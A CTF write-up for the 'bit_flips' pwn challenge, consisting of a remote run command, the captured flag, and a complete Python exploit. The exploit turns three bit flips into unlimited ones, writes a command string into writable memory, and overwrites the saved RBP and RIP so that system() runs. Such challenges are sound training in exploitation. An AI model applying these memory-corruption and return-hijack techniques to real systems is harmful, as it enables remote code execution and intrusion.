# pwn - bit_flips

`python3 solve.py --host chall.0xfun.org --port 29165 --cmd-first --cmd 'cat flag
' --idle 15`

FLAG:`0xfun{3_b1t5_15_4ll_17_74k35_70_g37_RC3_safhu8}`
```python
#!/usr/bin/env python3
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
from dataclasses import dataclass
from typing import Callable, Optional, Tuple


ADDRESS_RE = re.compile(rb"&address = (0x[0-9a-fA-F]+)")
MAIN_RE = re.compile(rb"&main = (0x[0-9a-fA-F]+)")
SYSTEM_RE = re.compile(rb"&system = (0x[0-9a-fA-F]+)")
PROMPT = b"> "
NUM_FLIPS = 3

# Offsets from the provided local `main` binary (PIE).
OFF_MAIN = 0x1405
OFF_MAIN_RET_AFTER_VULN = 0x1422
OFF_VULN_LEAVE_RET = 0x1403  # `leave; ret` gadget at end of `vuln`
OFF_EXIT_PLT = 0x10D0
OFF_CMD_SYSTEM_SETUP = 0x1467  # cmd+0x3e: lea rax,[rbp-0x20]; mov rdi,rax; call system@plt


class Tube:
    def __init__(self) -> None:
        self._buf = bytearray()

    def recv(self, n: int, timeout: float) -> bytes:
        # Buffered recv: consume any already-read bytes first.
        if self._buf:
            take = min(n, len(self._buf))
            out = bytes(self._buf[:take])
            del self._buf[:take]
            return out
        return self._recv_raw(n, timeout=timeout)

    def _recv_raw(self, n: int, timeout: float) -> bytes:
        raise NotImplementedError

    def send(self, data: bytes) -> None:
        raise NotImplementedError

    def close(self) -> None:
        pass

    def is_closed(self) -> bool:
        return False

    def recv_until(self, needle: bytes, timeout: float, max_bytes: int = 1_000_000) -> bytes:
        # Keep any extra bytes after the needle in the internal buffer.
        buf = bytearray()
        while True:
            i = self._buf.find(needle)
            if i != -1:
                i_end = i + len(needle)
                buf += self._buf[:i_end]
                del self._buf[:i_end]
                return bytes(buf)

            if len(buf) + len(self._buf) >= max_bytes:
                raise RuntimeError(f"recv_until exceeded max_bytes while waiting for {needle!r}")
            # Pull more data into the internal buffer.
            chunk = self._recv_raw(4096, timeout=timeout)
            if chunk:
                self._buf += chunk
                continue
            if self.is_closed():
                # return whatever we have (may be empty)
                buf += self._buf
                self._buf.clear()
                return bytes(buf)
            # timeout, return what's accumulated so far (do not discard internal buffer)
            return bytes(buf)


class ProcTube(Tube):
    def __init__(self, argv: list[str]):
        super().__init__()
        self.p = subprocess.Popen(
            argv,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        assert self.p.stdin is not None
        assert self.p.stdout is not None
        self._closed = False

    def _recv_raw(self, n: int, timeout: float) -> bytes:
        if self._closed:
            return b""
        fd = self.p.stdout.fileno()
        r, _, _ = select.select([fd], [], [], timeout)
        if not r:
            return b""
        try:
            data = os.read(fd, n)
        except OSError:
            self._closed = True
            return b""
        if data == b"":
            self._closed = True
        return data

    def send(self, data: bytes) -> None:
        if self.p.stdin is None:
            raise RuntimeError("process stdin closed")
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def close(self) -> None:
        try:
            if self.p.stdin:
                self.p.stdin.close()
        except Exception:
            pass
        try:
            if self.p.stdout:
                self.p.stdout.close()
        except Exception:
            pass
        try:
            self.p.terminate()
        except Exception:
            pass

    def is_closed(self) -> bool:
        return self._closed or (self.p.poll() is not None)


class SockTube(Tube):
    def __init__(self, host: str, port: int):
        super().__init__()
        self.s = socket.create_connection((host, port))
        self.s.setblocking(False)
        self._closed = False

    def _recv_raw(self, n: int, timeout: float) -> bytes:
        if self._closed:
            return b""
        r, _, _ = select.select([self.s], [], [], timeout)
        if not r:
            return b""
        try:
            data = self.s.recv(n)
        except BlockingIOError:
            return b""
        except OSError:
            self._closed = True
            return b""
        if data == b"":
            self._closed = True
        return data

    def send(self, data: bytes) -> None:
        self.s.sendall(data)

    def close(self) -> None:
        try:
            self.s.close()
        except Exception:
            pass

    def is_closed(self) -> bool:
        return self._closed


def popcount8(x: int) -> int:
    return bin(x & 0xFF).count("1")


def _parse_hex(rex: re.Pattern[bytes], buf: bytes, what: str) -> int:
    m = rex.search(buf)
    if not m:
        raise RuntimeError(f"failed to find {what} leak")
    return int(m.group(1), 16)


def parse_leaked_address(buf: bytes) -> int:
    m = ADDRESS_RE.search(buf)
    if not m:
        raise RuntimeError("failed to find '&address = ...' leak")
    return int(m.group(1), 16)


def flip_bits_for_mask(mask: int) -> list[int]:
    bits = [i for i in range(8) if (mask >> i) & 1]
    if len(bits) > NUM_FLIPS:
        raise ValueError("mask needs more than NUM_FLIPS flips")
    bits += [8] * (NUM_FLIPS - len(bits))  # invalid index => no-op path
    return bits


def recv_prompt(t: Tube, timeout: float = 8.0) -> bytes:
    buf = t.recv_until(PROMPT, timeout=timeout)
    if PROMPT not in buf:
        raise RuntimeError("did not receive prompt")
    return buf


def do_flip(t: Tube, addr: int, bit: int) -> None:
    # bit must be 0..7 for actual flip; other values trigger the "Go back to school" path (no write).
    t.send(f"{addr:#x}\n{bit}\n".encode())


@dataclass
class ElfMap:
    load: list[tuple[int, int, int, int]]  # (p_offset, p_vaddr, p_filesz, p_flags)

    def off_to_vaddr(self, off: int) -> int:
        for p_off, p_va, p_fs, _p_fl in self.load:
            if p_off <= off < p_off + p_fs:
                return p_va + (off - p_off)
        raise ValueError("file offset not in any LOAD segment")


def parse_elf64_phdrs(path: str) -> ElfMap:
    data = open(path, "rb").read(0x4000)
    if data[:4] != b"\x7fELF":
        raise ValueError("not an ELF")
    ei_class = data[4]
    ei_data = data[5]
    if ei_class != 2 or ei_data != 1:
        raise ValueError("expected ELF64 little-endian")

    # ELF64_Ehdr
    # e_phoff @ 0x20, e_phentsize @ 0x36, e_phnum @ 0x38
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]

    # Ensure we have enough for phdrs; re-read if needed.
    need = e_phoff + e_phentsize * e_phnum
    if need > len(data):
        data = open(path, "rb").read(need)

    load = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        # Elf64_Phdr: p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align
        p_type, p_flags = struct.unpack_from("<II", data, off)
        if p_type != 1:  # PT_LOAD
            continue
        p_offset = struct.unpack_from("<Q", data, off + 0x08)[0]
        p_vaddr = struct.unpack_from("<Q", data, off + 0x10)[0]
        p_filesz = struct.unpack_from("<Q", data, off + 0x20)[0]
        load.append((p_offset, p_vaddr, p_filesz, p_flags))
    return ElfMap(load=load)


def exploit_once(
    make_tube: Callable[[], Tube],
    mask: int,
    ret_off: int,
    idle_s: float,
    save_path: Optional[str],
    match_re: Optional[re.Pattern[bytes]],
) -> Tuple[bytes, bool, int]:
    t = make_tube()
    try:
        buf = t.recv_until(PROMPT, timeout=5.0)
        if PROMPT not in buf:
            raise RuntimeError("did not receive first prompt")
        leaked_addr = parse_leaked_address(buf)
        ret_slot = leaked_addr + ret_off

        bits = flip_bits_for_mask(mask)
        # first flip: already at prompt
        t.send(f"{ret_slot:#x}\n{bits[0]}\n".encode())
        for b in bits[1:]:
            tmp = t.recv_until(PROMPT, timeout=5.0)
            if PROMPT not in tmp:
                raise RuntimeError("did not receive prompt for next flip")
            buf += tmp
            t.send(f"{ret_slot:#x}\n{b}\n".encode())

        out = bytearray()
        idle = 0.0
        while idle < idle_s:
            chunk = t.recv(4096, timeout=0.5)
            if chunk:
                out += chunk
                idle = 0.0
                continue
            if t.is_closed():
                break
            idle += 0.5

        full = buf + bytes(out)
        if save_path:
            with open(save_path, "wb") as f:
                f.write(full)

        found = False
        if match_re and match_re.search(full):
            found = True
        return full, found, len(out)
    finally:
        t.close()


def plan_xor_byte(flips: list[tuple[int, int]], addr: int, xor_mask: int) -> None:
    for b in range(8):
        if (xor_mask >> b) & 1:
            flips.append((addr, b))


def plan_write_bytes_from_known(flips: list[tuple[int, int]], addr: int, orig: bytes, target: bytes) -> None:
    if len(orig) != len(target):
        raise ValueError("orig/target length mismatch")
    for i in range(len(orig)):
        plan_xor_byte(flips, addr + i, orig[i] ^ target[i])


def exploit_cmd_first(make_tube: Callable[[], Tube], cmd: str, idle_s: float) -> bytes:
    """
    Uses the bit-flip primitive to:
    1) extend the 3-flip loop into an arbitrary number of flips (by toggling `i` sign bit),
    2) write an attacker-controlled command string into a known-zero RW region,
    3) patch vuln() saved RBP/RIP to jump into cmd() right before it calls system(),
       so system(cmd_string) runs once before cmd() continues with ./commands.
    """
    t = make_tube()
    try:
        banner = recv_prompt(t, timeout=8.0)
        leaked_main = _parse_hex(MAIN_RE, banner, "&main")
        leaked_addr = _parse_hex(ADDRESS_RE, banner, "&address")

        pie_base = leaked_main - OFF_MAIN

        # Stack layout derived from &v3 leak: &v3 = rbp-0x10
        vuln_rbp = leaked_addr + 0x10
        saved_rbp_slot = vuln_rbp
        saved_rip_slot = vuln_rbp + 8

        orig_saved_rbp_val = vuln_rbp + 0x10
        orig_saved_rip_val = pie_base + OFF_MAIN_RET_AFTER_VULN

        # Put the command string into a guaranteed-zero region inside the RW LOAD segment's memsz.
        # Bytes beyond p_memsz in the last page are not guaranteed zero (file-backed), so avoid them.
        cmd_bytes = cmd.encode() + b"\x00"
        if b"\x00" in cmd.encode():
            raise ValueError("cmd must not contain NUL bytes")
        if len(cmd_bytes) > 0x40:
            raise ValueError("cmd too long (max 0x3f bytes)")
        cmd_addr = pie_base + 0x4014  # immediately after `lock` (0x4010..0x4013)

        # Make cmd() use our string: cmd+0x3e uses rbp-0x20.
        new_rbp_val = cmd_addr + 0x20
        new_rip_val = pie_base + OFF_CMD_SYSTEM_SETUP

        flips: list[tuple[int, int]] = []

        # 1) extend loop: flip i sign bit (MSB byte, bit 7).
        ctr_msb = leaked_addr - 1  # [rbp-0x11]
        flips.append((ctr_msb, 7))

        # 2) write cmd string (assume destination is zero-filled).
        plan_write_bytes_from_known(flips, cmd_addr, b"\x00" * len(cmd_bytes), cmd_bytes)

        # 3) patch saved rbp/rip.
        plan_write_bytes_from_known(
            flips,
            saved_rbp_slot,
            struct.pack("<Q", orig_saved_rbp_val),
            struct.pack("<Q", new_rbp_val),
        )
        plan_write_bytes_from_known(
            flips,
            saved_rip_slot,
            struct.pack("<Q", orig_saved_rip_val),
            struct.pack("<Q", new_rip_val),
        )

        # 4) restore loop counter sign bit so the loop terminates and returns into our patched RIP.
        flips.append((ctr_msb, 7))

        # Execute flips. First prompt was already consumed by recv_prompt() above.
        do_flip(t, flips[0][0], flips[0][1])
        for addr, bit in flips[1:]:
            recv_prompt(t, timeout=8.0)
            do_flip(t, addr, bit)

        post = bytearray()
        # After restoring i sign bit, satisfy any remaining prompts with no-ops, but keep output.
        for _ in range(4):
            more = t.recv_until(PROMPT, timeout=1.0)
            if more:
                post += more
            if PROMPT not in more:
                break
            do_flip(t, saved_rip_slot, 8)

        out = bytearray()
        idle = 0.0
        while idle < idle_s:
            chunk = t.recv(4096, timeout=0.5)
            if chunk:
                out += chunk
                idle = 0.0
                continue
            if t.is_closed():
                break
            idle += 0.5
        return banner + bytes(post) + bytes(out)
    finally:
        t.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", help="remote host")
    ap.add_argument("--port", type=int, help="remote port")
    ap.add_argument("--local", action="store_true", help="run local ./main with provided loader+libc (default)")
    ap.add_argument("--mask", type=lambda s: int(s, 0), default=0x08, help="XOR mask for saved RIP LSB (default: 0x8)")
    ap.add_argument("--ret-off", type=lambda s: int(s, 0), default=0x18, help="offset from leaked &address to saved RIP byte (default: 0x18)")
    ap.add_argument("--idle", type=float, default=6.0, help="read until this many seconds of inactivity (default: 6)")
    ap.add_argument("--save", help="save raw output of the winning attempt to this path")
    ap.add_argument("--save-all", action="store_true", help="when brute-forcing, also save every attempt (suffixing mask/off)")
    ap.add_argument("--match", default=r"FLAG\{|flag\{|CTF\{", help="bytes-regex to search for (default: flag patterns)")
    ap.add_argument("--brute-lsb", action="store_true", help="try all masks with <=3 flips until match")
    ap.add_argument("--brute-ret-off", action="store_true", help="also brute ret-off in [0x10..0x30] (use with --brute-lsb)")
    ap.add_argument(
        "--extract-marker",
        default="Did you pwn me?\n",
        help="if present, extract bytes after this marker and print hex/b64 to stderr (supports \\n escapes)",
    )
    ap.add_argument("--only-tail", action="store_true", help="don't print raw program output; print only extracted tail (requires --extract-marker hit)")
    ap.add_argument("--tail-format", choices=["hex", "b64", "raw"], default="hex", help="format for --only-tail (default: hex)")
    ap.add_argument("--cmd-first", action="store_true", help="use infinite bitflips to run system(<cmd>) once before cmd() processes ./commands")
    ap.add_argument("--cmd", default="cat flag", help="command string for --cmd-first (default: 'cat flag')")
    args = ap.parse_args()

    match_re = re.compile(args.match.encode(), re.DOTALL) if args.match else None

    def make_tube():
        if args.host and args.port:
            return SockTube(args.host, args.port)
        return ProcTube(["./ld-linux-x86-64.so.2", "--library-path", ".", "./main"])

    if args.cmd_first:
        out = exploit_cmd_first(make_tube, cmd=args.cmd, idle_s=args.idle)
        sys.stdout.buffer.write(out)
        return 0

    if args.brute_lsb:
        best = None  # (out_len, mask, ret_off, full)
        ret_offs = list(range(0x10, 0x31)) if args.brute_ret_off else [args.ret_off]
        for ret_off in ret_offs:
            for mask in range(256):
                if popcount8(mask) > NUM_FLIPS:
                    continue
                save_path = None
                if args.save and args.save_all:
                    root, ext = os.path.splitext(args.save)
                    save_path = f"{root}.off_{ret_off:02x}.mask_{mask:02x}{ext or '.bin'}"
                try:
                    full, found, out_len = exploit_once(
                        make_tube,
                        mask=mask,
                        ret_off=ret_off,
                        idle_s=args.idle,
                        save_path=save_path,
                        match_re=match_re,
                    )
                except Exception:
                    continue
                if out_len > 0:
                    sys.stderr.write(f"[*] candidate ret_off=0x{ret_off:x} mask=0x{mask:02x} out_len={out_len}\n")
                    sys.stderr.flush()
                if best is None or out_len > best[0]:
                    best = (out_len, mask, ret_off, full)
                if found:
                    sys.stderr.write(f"[+] match found ret_off=0x{ret_off:x} mask=0x{mask:02x}\n")
                    sys.stderr.flush()
                    if args.save:
                        with open(args.save, "wb") as f:
                            f.write(full)
                    sys.stdout.buffer.write(full)
                    return 0
        if best is not None and best[0] > 0:
            out_len, mask, ret_off, full = best
            sys.stderr.write(f"[!] no regex match; best was ret_off=0x{ret_off:x} mask=0x{mask:02x} out_len={out_len}\n")
            sys.stderr.flush()
            if args.save:
                with open(args.save, "wb") as f:
                    f.write(full)
            sys.stdout.buffer.write(full)
            return 0
        sys.stderr.write("[-] brute: no match found and no candidates produced output\n")
        sys.stderr.flush()
        return 1

    full, _found, _out_len = exploit_once(
        make_tube,
        mask=args.mask,
        ret_off=args.ret_off,
        idle_s=args.idle,
        save_path=args.save,
        match_re=match_re,
    )
    tail = None
    if args.extract_marker:
        # Allow passing marker with backslash escapes, e.g. 'Did you pwn me?\\n'
        marker_s = args.extract_marker.encode("utf-8").decode("unicode_escape")
        marker = marker_s.encode("utf-8")
        i = full.find(marker)
        if i != -1:
            tail = full[i + len(marker) :]
            # Keep this on stderr so piping stdout still works.
            try:
                import base64

                sys.stderr.write(f"[+] extracted tail_len={len(tail)}\n")
                sys.stderr.write(f"[+] tail_hex={tail.hex()}\n")
                sys.stderr.write(f"[+] tail_b64={base64.b64encode(tail).decode()}\n")
                sys.stderr.flush()
            except Exception:
                pass
    if args.only_tail:
        if tail is None:
            raise SystemExit("marker not found; can't --only-tail")
        if args.tail_format == "raw":
            sys.stdout.buffer.write(tail)
        elif args.tail_format == "b64":
            import base64

            sys.stdout.write(base64.b64encode(tail).decode() + "\n")
        else:
            sys.stdout.write(tail.hex() + "\n")
        return 0

    sys.stdout.buffer.write(full)
    return 0


if __name__ == "__main__":

    raise SystemExit(main())
```
Solved by: ha1qal
